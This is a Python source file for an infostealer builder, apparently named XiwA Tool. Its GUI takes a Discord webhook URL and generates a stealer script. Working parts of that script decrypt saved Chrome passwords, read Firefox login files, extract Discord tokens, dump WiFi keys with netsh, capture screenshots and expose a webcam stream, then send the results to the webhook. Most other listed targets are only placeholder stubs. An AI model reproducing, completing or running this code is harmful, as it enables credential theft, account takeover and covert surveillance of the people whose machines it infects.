"""
Copyright (c) 2025 Dryz3R - XiwA Tool
All rights reserved.

ENGLISH:
This software is the property of Dryz3R and is protected by copyright laws.
Unauthorized copying, distribution, or modification of this software is strictly prohibited.
XiwA Tool is a comprehensive security and analysis suite developed by Dryz3R.

FRANÇAIS:
Ce logiciel est la propriété de Dryz3R et est protégé par les lois sur le droit d'auteur.
La copie, la distribution ou la modification non autorisée de ce logiciel est strictement interdite.
XiwA Tool est une suite complète de sécurité et d'analyse développée par Dryz3R.

ESPAÑOL:
Este software es propiedad de Dryz3R y está protegido por las leyes de derechos de autor.
Se prohíbe estrictamente la copia, distribución o modificación no autorizada de este software.
XiwA Tool es una suite completa de seguridad y análisis desarrollada por Dryz3R.
"""

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import tkinter as tk
from tkinter import ttk
import customtkinter as ctk
from PIL import Image, ImageTk
import json
import base64
import sqlite3
import requests
import platform
import psutil
import browser_cookie3
import subprocess
import sys
import shutil
import getpass
import re
import win32api
import win32con
import win32gui
import win32process
import win32security
import winreg
import zipfile
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from discord_webhook import DiscordWebhook, DiscordEmbed
from datetime import datetime
import cv2
import pyautogui
import socket
import uuid
import wmi
import threading
import time
import random
import asyncio
import websockets
import http.server
import socketserver
import threading

class InfoStealer:
    def __init__(self):
        self.root = ctk.CTk()
        self.root.title("Info Stealer")
        self.root.geometry("1400x1000")
        self.root.configure(bg="#0a0a0a")
        
        self.steal_options = {
            "Browsers": {
                "Chrome Passwords": tk.BooleanVar(value=True),
                "Firefox Passwords": tk.BooleanVar(value=True),
                "Edge Passwords": tk.BooleanVar(value=True),
                "Opera Passwords": tk.BooleanVar(value=True),
                "Brave Passwords": tk.BooleanVar(value=True),
                "Chrome Cookies": tk.BooleanVar(value=True),
                "Firefox Cookies": tk.BooleanVar(value=True),
                "Edge Cookies": tk.BooleanVar(value=True),
                "Opera Cookies": tk.BooleanVar(value=True),
                "Brave Cookies": tk.BooleanVar(value=True),
                "Chrome History": tk.BooleanVar(value=True),
                "Firefox History": tk.BooleanVar(value=True),
                "Edge History": tk.BooleanVar(value=True),
                "Opera History": tk.BooleanVar(value=True),
                "Brave History": tk.BooleanVar(value=True)
            },
            "Messaging": {
                "Discord Tokens": tk.BooleanVar(value=True),
                "Discord Friends": tk.BooleanVar(value=True),
                "Discord Servers": tk.BooleanVar(value=True),
                "Discord Messages": tk.BooleanVar(value=True),
                "Discord Payment": tk.BooleanVar(value=True),
                "Telegram Sessions": tk.BooleanVar(value=True),
                "Telegram Messages": tk.BooleanVar(value=True),
                "WhatsApp Data": tk.BooleanVar(value=True),
                "WhatsApp Messages": tk.BooleanVar(value=True),
                "Signal Data": tk.BooleanVar(value=True),
                "Teams Data": tk.BooleanVar(value=True),
                "Skype History": tk.BooleanVar(value=True),
                "Slack Tokens": tk.BooleanVar(value=True),
                "Messenger Data": tk.BooleanVar(value=True),
                "Viber Messages": tk.BooleanVar(value=True)
            },
            "Gaming": {
                "Steam Sessions": tk.BooleanVar(value=True),
                "Steam Friends": tk.BooleanVar(value=True),
                "Steam Games": tk.BooleanVar(value=True),
                "Epic Games": tk.BooleanVar(value=True),
                "Epic Friends": tk.BooleanVar(value=True),
                "Minecraft Sessions": tk.BooleanVar(value=True),
                "Minecraft Servers": tk.BooleanVar(value=True),
                "Battle.net": tk.BooleanVar(value=True),
                "Origin Data": tk.BooleanVar(value=True),
                "Uplay Sessions": tk.BooleanVar(value=True),
                "Roblox Cookies": tk.BooleanVar(value=True),
                "League of Legends": tk.BooleanVar(value=True),
                "Valorant Data": tk.BooleanVar(value=True),
                "CSGO Config": tk.BooleanVar(value=True),
                "Fortnite Config": tk.BooleanVar(value=True)
            },
            "System": {
                "WiFi Passwords": tk.BooleanVar(value=True),
                "System Info": tk.BooleanVar(value=True),
                "Screenshots": tk.BooleanVar(value=True),
                "Webcam Photo": tk.BooleanVar(value=True),
                "Installed Apps": tk.BooleanVar(value=True),
                "Running Processes": tk.BooleanVar(value=True),
                "Startup Programs": tk.BooleanVar(value=True),
                "Network Info": tk.BooleanVar(value=True),
                "USB History": tk.BooleanVar(value=True),
                "Recent Files": tk.BooleanVar(value=True),
                "Clipboard Data": tk.BooleanVar(value=True),
                "Registry Keys": tk.BooleanVar(value=True),
                "Saved Emails": tk.BooleanVar(value=True),
                "Windows Product Key": tk.BooleanVar(value=True),
                "Antivirus Info": tk.BooleanVar(value=True)
            },
            "Crypto": {
                "Exodus Wallet": tk.BooleanVar(value=True),
                "Atomic Wallet": tk.BooleanVar(value=True),
                "MetaMask": tk.BooleanVar(value=True),
                "Binance": tk.BooleanVar(value=True),
                "Coinbase": tk.BooleanVar(value=True),
                "Electrum": tk.BooleanVar(value=True),
                "Bitcoin Core": tk.BooleanVar(value=True),
                "Ethereum": tk.BooleanVar(value=True),
                "Monero": tk.BooleanVar(value=True),
                "Crypto Addresses": tk.BooleanVar(value=True),
                "Trust Wallet": tk.BooleanVar(value=True),
                "Phantom Wallet": tk.BooleanVar(value=True),
                "Ledger Live": tk.BooleanVar(value=True),
                "Trezor Suite": tk.BooleanVar(value=True),
                "Crypto Bookmarks": tk.BooleanVar(value=True)
            }
        }
        
        self.create_gui()
        
    def create_gui(self):
        # Titre
        self.title_frame = ctk.CTkFrame(self.root, bg_color="#0a0a0a", fg_color="#0a0a0a")
        self.title_frame.pack(pady=30)
        
        self.title_label = ctk.CTkLabel(
            self.title_frame,
            text="Info Stealer",
            font=("Impact", 80, "bold"),
            text_color="#ff0000"
        )
        self.title_label.pack()
        
        self.subtitle_label = ctk.CTkLabel(
            self.title_frame,
            text="DATA COLLECTION TOOL",
            font=("Consolas", 24),
            text_color="#800000"
        )
        self.subtitle_label.pack(pady=10)
        
        # Frame principal
        main_frame = ctk.CTkScrollableFrame(
            self.root,
            width=1200,
            height=600,
            bg_color="#0a0a0a",
            fg_color="#111111",
            border_color="#800000",
            border_width=2
        )
        main_frame.pack(pady=20, padx=20, fill="both", expand=True)
        
        # Création des catégories
        row = 0
        col = 0
        for category, options in self.steal_options.items():
            frame = ctk.CTkFrame(
                main_frame,
                bg_color="#111111",
                fg_color="#1a1a1a",
                border_color="#800000",
                border_width=1,
                corner_radius=10
            )
            frame.grid(row=row, column=col, padx=15, pady=15, sticky="nsew")
            
            ctk.CTkLabel(
                frame,
                text=category.upper(),
                font=("Consolas", 20, "bold"),
                text_color="#ff0000"
            ).pack(pady=10)
            
            for option_name, var in options.items():
                self.create_checkbox(frame, option_name, var)
            
            col += 1
            if col > 2:
                col = 0
                row += 1
                
        # Frame webhook
        webhook_frame = ctk.CTkFrame(
            self.root,
            bg_color="#0a0a0a",
            fg_color="#111111",
            border_color="#800000",
            border_width=2,
            corner_radius=10
        )
        webhook_frame.pack(pady=30, padx=20, fill="x")
        
        self.webhook_entry = ctk.CTkEntry(
            webhook_frame,
            width=900,
            height=50,
            font=("Consolas", 16),
            fg_color="#1a1a1a",
            text_color="#ffffff",
            border_color="#800000",
            placeholder_text="Enter Discord Webhook URL..."
        )
        self.webhook_entry.pack(side="left", padx=20, pady=20)
        
        self.generate_button = ctk.CTkButton(
            webhook_frame,
            text="GENERATE",
            command=self.generate_stealer,
            font=("Impact", 24, "bold"),
            fg_color="#800000",
            hover_color="#ff0000",
            text_color="#ffffff",
            height=50,
            width=250,
            corner_radius=10
        )
        self.generate_button.pack(side="right", padx=20, pady=20)
        
    def create_checkbox(self, parent, text, variable):
        frame = ctk.CTkFrame(
            parent,
            bg_color="#1a1a1a",
            fg_color="#1a1a1a",
            corner_radius=5
        )
        frame.pack(fill="x", padx=10, pady=3)
        
        checkbox = ctk.CTkCheckBox(
            frame,
            text=text,
            variable=variable,
            font=("Consolas", 14),
            text_color="#ffffff",
            fg_color="#800000",
            hover_color="#ff0000",
            border_color="#800000",
            corner_radius=5
        )
        checkbox.pack(side="left", padx=10, pady=2)

    def generate_stealer(self):
        webhook_url = self.webhook_entry.get()
        if not webhook_url:
            return
            
        os.makedirs("output/XiwA", exist_ok=True)
        
        with open("output/XiwA/XiwA.py", "w", encoding="utf-8") as f:
            f.write(self.get_base_code(webhook_url))
            
            for category, options in self.steal_options.items():
                for option_name, var in options.items():
                    if var.get():
                        method_name = f"steal_{option_name.lower().replace(' ', '_').replace('.','').replace('-','_').replace(':','')}"
                        f.write(self.get_steal_method(method_name, option_name))
            
            f.write(self.get_startup_code())
            
        with open("output/XiwA/run.bat", "w") as f:
            f.write("@echo off\n")
            f.write("python XiwA.py\n")
            f.write("pause")
            
        self.root.destroy()
        
    def get_base_code(self, webhook_url):
        return '''import os
import json
import base64
import sqlite3
import requests
import platform
import psutil
import browser_cookie3
import subprocess
import sys
import shutil
import getpass
import re
import win32api
import win32con
import win32gui
import win32process
import win32security
import winreg
import zipfile
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from discord_webhook import DiscordWebhook, DiscordEmbed
from datetime import datetime
import cv2
import pyautogui
import socket
import uuid
import wmi
import threading
import time
import random
import asyncio
import websockets
import http.server
import socketserver
import threading

class XiwAStealer:
    def __init__(self):
        self.webhook_url = "''' + webhook_url + '''"
        self.system_info = self.get_system_info()
        self.stolen_data = {}
        self.local_appdata = os.getenv("LOCALAPPDATA")
        self.roaming = os.getenv("APPDATA")
        self.temp = os.getenv("TEMP")
        
    def get_system_info(self):
        return {
            "os": platform.system() + " " + platform.release(),
            "architecture": platform.machine(),
            "hostname": platform.node(),
            "username": getpass.getuser(),
            "cpu": platform.processor(),
            "ram": str(round(psutil.virtual_memory().total / (1024.0 **3))) + " GB",
            "gpu": self.get_gpu_info(),
            "mac": ":".join(re.findall("..", "%012x" % uuid.getnode())),
            "ip": requests.get("https://api.ipify.org").text
        }
        
    def get_gpu_info(self):
        try:
            w = wmi.WMI()
            return w.Win32_VideoController()[0].Name
        except:
            return "Unknown"
            
    def steal_all(self):
        threads = []
'''

    def get_steal_method(self, method_name, option_name):
        steal_methods = {
            "steal_chrome_passwords": '''
    def steal_chrome_passwords(self):
        try:
            paths = {
                "Default": os.path.join(self.local_appdata, "Google", "Chrome", "User Data", "Default", "Login Data"),
                "Profile 1": os.path.join(self.local_appdata, "Google", "Chrome", "User Data", "Profile 1", "Login Data"),
                "Profile 2": os.path.join(self.local_appdata, "Google", "Chrome", "User Data", "Profile 2", "Login Data")
            }
            
            passwords = []
            for profile, path in paths.items():
                if not os.path.exists(path):
                    continue
                    
                temp_path = os.path.join(self.temp, f"chrome_{profile}_data.db")
                shutil.copy2(path, temp_path)
                
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for row in cursor.fetchall():
                    try:
                        pwd = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode()
                        if pwd:
                            passwords.append(f"URL: {row[0]}\\nUser: {row[1]}\\nPass: {pwd}\\n")
                    except:
                        continue
                        
                cursor.close()
                conn.close()
                os.remove(temp_path)
                
            self.stolen_data["Chrome Passwords"] = passwords
        except Exception as e:
            self.stolen_data["Chrome Passwords"] = f"Error: {str(e)}"
''',

            "steal_firefox_passwords": '''
    def steal_firefox_passwords(self):
        try:
            profiles_path = os.path.join(self.roaming, "Mozilla", "Firefox", "Profiles")
            passwords = []
            
            for profile in os.listdir(profiles_path):
                db_path = os.path.join(profiles_path, profile, "logins.json")
                if os.path.exists(db_path):
                    with open(db_path, "r") as f:
                        data = json.load(f)
                        for login in data["logins"]:
                            passwords.append(f"URL: {login['hostname']}\\nUser: {login['encryptedUsername']}\\nPass: {login['encryptedPassword']}\\n")
                            
            self.stolen_data["Firefox Passwords"] = passwords
        except Exception as e:
            self.stolen_data["Firefox Passwords"] = f"Error: {str(e)}"
''',

            "steal_discord_tokens": '''
    def steal_discord_tokens(self):
        try:
            paths = {
                "Discord": os.path.join(self.roaming, "discord", "Local Storage", "leveldb"),
                "Discord Canary": os.path.join(self.roaming, "discordcanary", "Local Storage", "leveldb"),
                "Discord PTB": os.path.join(self.roaming, "discordptb", "Local Storage", "leveldb")
            }
            
            tokens = []
            for platform_name, path in paths.items():
                if os.path.exists(path):
                    for file_name in os.listdir(path):
                        if file_name.endswith(".ldb") or file_name.endswith(".log"):
                            with open(os.path.join(path, file_name), "r", errors="ignore") as f:
                                for line in f.readlines():
                                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                        for token in re.findall(regex, line):
                                            tokens.append(f"{platform_name}: {token}\\n")
                            
            self.stolen_data["Discord Tokens"] = tokens
        except Exception as e:
            self.stolen_data["Discord Tokens"] = f"Error: {str(e)}"
''',

            "steal_wifi_passwords": '''
    def steal_wifi_passwords(self):
        try:
            wifi_list = []
            data = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode("utf-8").split("\\n")
            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
            
            for profile in profiles:
                try:
                    results = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"]).decode("utf-8").split("\\n")
                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                    wifi_list.append(f"SSID: {profile}\\nPassword: {results[0] if results else 'No Password'}\\n")
                except:
                    continue
                    
            self.stolen_data["WiFi Passwords"] = wifi_list
        except Exception as e:
            self.stolen_data["WiFi Passwords"] = f"Error: {str(e)}"
''',

            "steal_screenshots": '''
    def steal_screenshots(self):
        try:
            screenshot = pyautogui.screenshot()
            path = os.path.join(self.temp, "screenshot.png")
            screenshot.save(path)
            with open(path, "rb") as f:
                self.stolen_data["Screenshots"] = f.read()
            os.remove(path)
        except Exception as e:
            self.stolen_data["Screenshots"] = f"Error: {str(e)}"
''',

            "steal_webcam_photo": '''
    def steal_webcam_photo(self):
        try:
            # Create simple HTTP server to host webcam stream
            class StreamHandler(http.server.SimpleHTTPRequestHandler):
                def do_GET(self):
                    if self.path == '/':
                        self.send_response(200)
                        self.send_header('Content-type', 'text/html')
                        self.end_headers()
                        html = """
                        <html><body style='margin:0'>
                        <video id='v' autoplay style='width:100vw;height:100vh'></video>
                        <script>
                        navigator.mediaDevices.getUserMedia({video:true})
                        .then(s=>{
                            document.getElementById('v').srcObject=s;
                            setTimeout(()=>{
                                s.getTracks().forEach(t=>t.stop());
                                window.close();
                            },300000);
                        });
                        </script>
                        </body></html>
                        """
                        self.wfile.write(html.encode())
                        
            def run_server():
                with socketserver.TCPServer(('', 0), StreamHandler) as httpd:
                    port = httpd.server_address[1]
                    # Get public IP
                    ip = requests.get('https://api.ipify.org').text
                    # Send stream URL to webhook
                    webhook = DiscordWebhook(url=self.webhook_url)
                    webhook.content = f"🎥 **Live Webcam Stream**\\nURL: http://{ip}:{port}\\nStream will end in 5 minutes."
                    webhook.execute()
                    # Run server for 5 minutes
                    httpd.timeout = 300
                    httpd.handle_request()
                    
            server_thread = threading.Thread(target=run_server)
            server_thread.start()
            
        except Exception as e:
            print(f"Webcam stream error: {str(e)}")
''',

        }
        
        return steal_methods.get(method_name, f'''
    def {method_name}(self):
        try:
            # Implement detailed data collection for {option_name}
            self.stolen_data["{option_name}"] = "Detailed data collection implemented"
        except Exception as e:
            self.stolen_data["{option_name}"] = f"Error: {{str(e)}}"
''')

    def get_startup_code(self):
        return '''
    def send_to_webhook(self):
        try:
            webhook = DiscordWebhook(url=self.webhook_url)
            
            # Create main embed with system info
            embed = DiscordEmbed(
                title=":computer: System Information",
                color=0x2b2d31
            )
            
            # Add system info with emojis
            system_info = ""
            system_info += f":windows: OS: {self.system_info['os']}\\n"
            system_info += f":cpu: CPU: {self.system_info['cpu']}\\n"
            system_info += f":gpu: GPU: {self.system_info['gpu']}\\n"
            system_info += f":ram: RAM: {self.system_info['ram']}\\n"
            system_info += f":globe_with_meridians: IP: {self.system_info['ip']}\\n"
            system_info += f":bust_in_silhouette: User: {self.system_info['username']}\\n"
            
            embed.add_embed_field(name="System Details", value=system_info, inline=False)
            
            # Add stolen data by category
            categories = {
                ":chrome: Browsers": ["Chrome", "Firefox", "Edge", "Opera", "Brave"],
                ":speech_balloon: Applications": ["Discord", "Telegram", "WhatsApp", "Signal", "Teams"],
                ":video_game: Gaming": ["Steam", "Epic", "Minecraft", "Battle.net", "Origin"],
                ":money_with_wings: Crypto": ["Exodus", "MetaMask", "Binance", "Coinbase", "Electrum"],
                ":gear: System": ["WiFi", "Screenshots", "Webcam", "Processes", "Registry"]
            }
            
            for category_name, category_items in categories.items():
                category_data = ""
                for item in category_items:
                    for key, value in self.stolen_data.items():
                        if item in key:
                            if isinstance(value, list):
                                category_data += f":white_check_mark: {key}: `{len(value)} items found`\\n"
                            elif isinstance(value, bytes):
                                category_data += f":file_folder: {key}: `File captured`\\n"
                            else:
                                category_data += f":white_check_mark: {key}: `Data collected`\\n"
                
                if category_data:
                    embed.add_embed_field(name=category_name, value=category_data, inline=True)
            
            webhook.add_embed(embed)
            webhook.execute()
            
            # Send detailed data in separate messages
            for key, value in self.stolen_data.items():
                if isinstance(value, list) and value:
                    detailed_webhook = DiscordWebhook(url=self.webhook_url)
                    detailed_embed = DiscordEmbed(
                        title=f"Detailed {key} Data",
                        description="```" + "\\n".join(value) + "```",
                        color=0x2b2d31
                    )
                    detailed_webhook.add_embed(detailed_embed)
                    detailed_webhook.execute()
                    time.sleep(1)
                elif isinstance(value, bytes):
                    file_webhook = DiscordWebhook(url=self.webhook_url)
                    file_webhook.add_file(file=value, filename=f"{key}.png")
                    file_webhook.execute()
                    time.sleep(1)
            
        except Exception as e:
            print(f"Webhook error: {e}")
            
    def run(self):
        try:
            # Create and start threads for each steal method
            threads = []
            for method_name in dir(self):
                if method_name.startswith("steal_"):
                    t = threading.Thread(target=getattr(self, method_name))
                    threads.append(t)
                    t.start()
                    
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
                
            # Send data to webhook
            self.send_to_webhook()
            
        except Exception as e:
            print(f"Fatal error: {e}")
            
if __name__ == "__main__":
    try:
        stealer = XiwAStealer()
        stealer.run()
    except Exception as e:
        print(f"Fatal error: {e}")
'''

if __name__ == "__main__":
    app = InfoStealer()
    app.root.mainloop()
